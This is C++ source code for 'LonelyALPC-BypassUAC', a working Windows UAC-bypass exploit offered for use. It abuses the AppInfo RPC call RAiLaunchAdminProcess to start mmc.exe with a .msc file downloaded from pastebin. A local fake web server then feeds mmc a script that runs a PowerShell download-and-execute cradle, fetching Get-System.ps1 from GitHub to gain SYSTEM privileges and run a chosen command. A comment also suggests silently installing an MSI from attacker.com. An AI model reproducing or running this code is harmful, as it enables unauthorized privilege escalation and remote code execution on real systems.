//----------------------------------------------------------------------+
// @w4fz5uck5 | I'm not the exploit author                              |
//            | I code for fun!                                         |
//	      | Thanks to the author for sharing this amazing technique!|
//------------'---------------------------------------------------------+-----------------+
// Original source:      | https://github.com/DimopoulosElias/alpc-mmc-uac-bypass         |
//		         | https://www.youtube.com/watch?v=D-F5RxZ_yXc                    |
//			 | https://www.rump.beer/2017/slides/from_alpc_to_uac_bypass.pdf  | 
//			 | https://youtu.be/eOXq-2Gg6lU                                   |
//-----------------------'----------------------------------------------------------------+

#pragma once

#include "Socket.h"
#include <urlmon.h>
#include <list>
#include <process.h>
#include "rpc_h.h"
#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <memory>
#include <thread>
#include <mutex>
#include <iostream>
#include <chrono>

#define RPC_USE_NATIVE_WCHAR
#define DBG 1

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "urlmon.lib")

using namespace std;

// Thread functions
auto g_lock() {
	static std::mutex m; // a global living mutyex
	return std::unique_lock<decltype(m)>(m); // RAII based lock
}

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle) {
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW((RPC_WSTR)L"201ef99a-7fa0-444c-9399-19ba84f12a1a", (RPC_WSTR)L"ncalrpc",
		nullptr, nullptr, nullptr, &StringBinding);
	if (status == RPC_S_OK) {
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)& SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

extern "C" void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len) {
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR* ptr) {
	free(ptr);
}

void RunExploit(size_t n) {
	for (size_t i = 0; i < n; ++i)
	{
		using namespace std::literals;
		std::this_thread::sleep_for(100ms); //slower than func_1
		{
			auto lk = g_lock(); //keep output locked up to }
			std::cout << "func_1 - iteration " << i << std::endl;
			RPC_BINDING_HANDLE handle;
			RPC_STATUS status = CreateBindingHandle(&handle);

			struct Struct_14_t StructMember10 = { 0,0 };
			struct Struct_22_t StructMember0 = { L"StructMember0", 0, 0, 0, 0, 0, 0, 0, 0, 0, StructMember10 };
			struct Struct_56_t Struct_56;
			long arg_12;

			//  @w4fz5uck5
			Proc0_RAiLaunchAdminProcess(handle, L"C:\\Windows\\System32\\mmc.exe", L"XXX,wf.msc \"\\\\127.0.0.1\\C$\\Windows\\tasks\\WinDrivers.msc\"", 0x1, 0x00000400, L"D:\\", L"WinSta0\\Default", &StructMember0, 0, 0xffffffff, &Struct_56, &arg_12);
		}
	}

}
//  @w4fz5uck5
// Get ARGV to be used by exploit!
string getArgv;

typedef std::list<Socket*> socket_list;
socket_list g_connections;

unsigned __stdcall Connection(void* a) {

	Socket* s = (Socket*)a;

	g_connections.push_back(s);

	// Send command to run as SYSTEM by mmc.exe 
	if (DBG) printf("[*] Sending SYSTEM RCE Payload to our Webserver\n");

	s->ReceiveBytes();
	s->SendLine("HTTP/1.1 200 OK");
	s->SendLine("Content-type: text/html");
	s->SendLine("Connection: Close");
	s->SendLine("");
	
	// Attackers could change the link below to his webserver which contains some privesc scripts!
	//
	// powershell.exe  -WindowStyle Hidden -nop -ep bypass -c IEX(new-object net.webclient).DownloadString(\'https://raw.githubusercontent.com/HarmJ0y/Misc-PowerShell/master/Get-System.ps1\'); Get-System -Technique Token; cmd.exe /C taskkill /F /IM mmc.exe 
	// SHITTY METHOD TO UTILIZE Get-System.ps1 sorry :( 
	// 
	// IDEA For Remote code execution with SYSTEM Privileges
	// .\LonelyALPC-BypassUAC.exe "msiexec /q /i https://attacker.com/package.msi"

	s->SendLine("<html><head><script>external.ExecuteShellCommand(\"cmd.exe\", \"C:\", \"/C taskkill /F /IM mmc.exe && powershell.exe  -nop -ep bypass -c IEX(new-object net.webclient).DownloadString(\'https://raw.githubusercontent.com/HarmJ0y/Misc-PowerShell/master/Get-System.ps1\'); Get-System -Technique Token; Get-System -WhoAmI; " + getArgv + " \", \"Restored\"); </script></head></html>");
	g_connections.remove(s);
	delete s;
	return 0;
}

//  @w4fz5uck5
int Run_Server(size_t n) {
	if (DBG) printf("[*] Starting fake server at port: 65000!\n");
	for (size_t i = 0; i < n; ++i) {
		using namespace std::literals;
		// faster than func_2
		std::this_thread::sleep_for(200ms); {
			auto lk = g_lock(); // keep output locked up to 
			SocketServer in(65000, 5);
			for (int i = 0; i < 2; i++) {
				Socket* s = in.Accept();
				unsigned ret;
				_beginthreadex(0, 0, Connection, (void*)s, 0, &ret);
			}
		}
	}
	return 1;
}

//  @w4fz5uck5
int XPL() {
	// Initialize share to C$ path (Exploit 1 stage)
	if (DBG) printf("[+] Initializing C$ share..\n");
	system("net use \\\\127.0.0.1\\C$");

	HRESULT hr;
	// SHITTY METHOD TO Get WinDrivers.msc File, you could insert some base64 here too! sorry :)
	LPCTSTR Url = _T("https://pastebin.com/raw/qr2PySMV"), File = _T("C:\\Windows\\tasks\\WinDrivers.msc");
	hr = URLDownloadToFile(0, Url, File, 0, 0);
	if (hr == S_OK) {

		if (DBG) printf("[+] C:\\Windows\\tasks\\WinDrivers.msc Downloaded Successfully!\n");
		// THREADING TO RUN EXPLOIT!
		std::thread t1(Run_Server, 1);
		std::thread t2(RunExploit, 2);
		t1.join();
		t2.join();
	
		return 1;
	}
	return 0;
}
//  @w4fz5uck5
// Check if current user is on Administrator Group!
bool cAdminGroup() {
	DWORD i, dwSize = 0, dwResult = 0;
	HANDLE hToken;
	PTOKEN_GROUPS pGroupInfo;
	SID_NAME_USE SidType;
	WCHAR lpName[256];
	WCHAR lpDomain[256];
	BYTE sidBuffer[100];
	PSID pSID = (PSID)& sidBuffer;
	BOOL belongsToAdministratorsGroup = FALSE;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		if (DBG) printf(" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
		return TRUE;
	}
	else {

		if (!GetTokenInformation(hToken, TokenGroups, NULL, dwSize, &dwSize)) {
			dwResult = GetLastError();
			if (dwResult != ERROR_INSUFFICIENT_BUFFER)
			{
				if (DBG) printf(" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
				return TRUE;
			}
		}

		pGroupInfo = (PTOKEN_GROUPS)GlobalAlloc(GPTR, dwSize);

		if (!GetTokenInformation(hToken, TokenGroups, pGroupInfo, dwSize, &dwSize)) {
			if (DBG) printf(" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
			return TRUE;
		}
		else {
			SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
			if (!AllocateAndInitializeSid(&SIDAuth, 2,
				SECURITY_BUILTIN_DOMAIN_RID,
				DOMAIN_ALIAS_RID_ADMINS,
				0, 0, 0, 0, 0, 0,
				&pSID)) {
				if (DBG) printf(" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
				return TRUE;
			}
			else {

				for (i = 0; i < pGroupInfo->GroupCount; i++) {
					if (EqualSid(pSID, pGroupInfo->Groups[i].Sid)) {
						dwSize = 256;
						if (!LookupAccountSid(NULL,
							pGroupInfo->Groups[i].Sid,
							lpName,
							&dwSize,
							lpDomain,
							&dwSize,
							&SidType)) {
							dwResult = GetLastError();
							if (dwResult == ERROR_NONE_MAPPED)
								wcscpy_s(lpName, sizeof(lpName), L"NONE_MAPPED");
							else {
								if (DBG) printf(" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
								return TRUE;
							}
						}
						else {
							belongsToAdministratorsGroup = TRUE;
							break;
						}
					}
				}
			}
		}
	}

	if (pSID) {
		FreeSid(pSID);
	}
	if (pGroupInfo) {
		GlobalFree(pGroupInfo);
	}
	return belongsToAdministratorsGroup;
}

//  @w4fz5uck5
int main(int argc, char *argv[]) {
	
	if (DBG) {
		printf("\n");
		printf("      []   , ----.__-*\n");
		printf("   __ || _/ _.\n");
		printf("  /  O||    /|\n");
		printf(" /    ""   / /\n");
		printf("/_______ _/ /\n");
		printf("|_ __ ____|/\n");
		printf("'\n'-=> LonelyALPC-BypassUAC by: @w4fz5uck5\n");
		printf(" '--=> Usage: .\\LonelyALPC-BypassUAC.exe \"calc.exe && notepad.exe\"\n\n");
	}

	// Return argv to be used on Connection() function
	if (argv[1] != NULL) {
		if (cAdminGroup()) {
			getArgv = argv[1];
			XPL();
		}
		else {
			if (DBG) printf("[-] Current User isn't on Administrator group!\n");
			std::cin.get();
			return 0;
		}
	} 
	else {
		if(DBG) printf("[-] Missing arguments! (argv[1])!!\n");
		std::cin.get();
		return 0;
	}

	return 1;
}
